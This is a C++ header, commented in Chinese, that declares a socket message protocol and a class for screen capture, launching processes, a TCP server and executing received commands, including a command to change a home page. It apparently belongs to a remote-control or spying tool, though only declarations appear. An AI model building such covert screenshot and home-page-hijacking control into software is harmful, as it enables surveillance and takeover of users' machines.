#pragma once
#include "stdafx.h"


//--------------------------------------
typedef struct m_sendmessage
{
	int type;//保存类型，1 --修改主页  2--屏幕截图  0--登陆信息
	char data[1020];//type为1时，无意义；type为2 时，为图片信息；type为0时，登陆信息welcom
}sendmessage, *psendmessage;

typedef struct m_recvmessage
{
	int type;//保存类型，1 --修改主页  2--屏幕截图
	WCHAR data[50];//type为1时，无意义；type为2 时，为需要修改的主页的地址
}recvmessage, *precvmessage;

class CCaptureScreen {
public:
	/**
	* GDI 截屏函数
	*
	* 参数 hwnd   要截屏的窗口句柄
	* 参数 dirPath    截图存放目录
	* 参数 filename 截图名称
	*/
	static DWORD CaptureScreenImage(HWND hwnd);

	DWORD CreateUserProcess(WCHAR* lpszFileName, WCHAR* cmd);

	bool SetTcpServer();

	void controlExec(precvmessage precv, SOCKET socket);

private:
	static HMODULE getCurrModuleHandle();

};